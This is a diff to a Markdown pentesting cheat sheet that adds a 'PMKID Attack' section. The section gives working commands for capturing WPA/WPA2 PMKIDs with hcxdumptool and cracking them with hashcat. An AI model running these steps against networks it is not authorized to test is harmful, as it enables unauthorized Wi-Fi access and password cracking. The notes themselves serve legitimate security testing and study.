@@ -50,7 +50,7 @@ reaver -i mon0 -c 1 -b 28:B2:BD:F4:FF:F1
 ```
 
 
-## Cracking MIC (4-Way Handshake)
+### Cracking MIC (4-Way Handshake)
 ---
 Capture the MIC
 
@@ -105,6 +105,89 @@ aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap
 ```
 
 
+### PMKID Attack
+---
+This attack utilizes a feature of WPA and WPA2 protocols that allows roaming (switching from one access point to another seamlessly), routers store the "PMKID" in a cache to make roaming easier.
+This attack is so powerful because it allows an attacker to capture and crack the PMK without first deauthing clients.
+
+Put interface into monitor mode
+```bash
+sudo airmon-ng start wlan0
+```
+
+scan for the target network and determine if it is vulnerable to the PMKID attack.
+We need to monitor for these three status codes:
+1. EAPOL
+2. ASSOCIATION and REASSOCIATION
+3. EAPOL and ASSOCIATION and REASSOCIATION
+
+### For hcxtools <= 6.2.9
+
+```
+hcxdumptool -i wlan0mon --enable_status=3
+```
+We want to see the `PMKID` in the output, now we discover the bssid with aerodump
+
+```bash
+airodump-ng wlan0mon --essid targetnetwork
+```
+
+Once we have the bssid of the target, we can properly target with hcxdumptool
+
+```bash
+hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=E2:73:E7:F5:98:91 --filtermode=2 -o PMKIDCap.pcap
+```
+
+!!! alert "I can take a very long time to capture the PMKID, you can speed it up by executing the command again"
+
+Now we can convert the pcap to a hash to crack
+
+```bash
+hcxpcapngtool -o hash PMKIDCap.pcap
+```
+
+Now Crack the hash
+
+```bash
+hashcat -m 22000 --force hash /opt/wordlist.txt
+hashcat -m 22000 --force hash /opt/wordlist.txt --show
+```
+
+### For hcxtools >= 6.3.0
+
+Generate a BPF file
+
+One AP:
+
+```bash
+hcxdumptool --bpfc="wlan addr3 <BSSID>" > SSID.bpf
+```
+
+Multiple:
+
+```bash
+hcxdumptool --bpfc="wlan addr3 <BSSID1> or wlan addr3 <BSSID2>" > SSID.bpf
+```
+
+Run against target
+
+```bash
+sudo hcxdumptool --rds=1 -F --bpf=SSID.bpf -i wlan1mon -w outfile.pcapng
+```
+
+or with targets list
+
+```bash
+sudo hcxdumptool --essidlist=targets.txt -i wlan1mon -w outfile.pcapng
+```
+
+You are looking for a `+` under the 3 or the P column.
+Convert to hash and crack (dictionary)
+
+```bash
+hcxpcapngtool -o hash PMKIDCap.pcap
+hashcat -m 22000 --force hash /opt/wordlist.txt
+```
 
 
 ### Deauth attacks
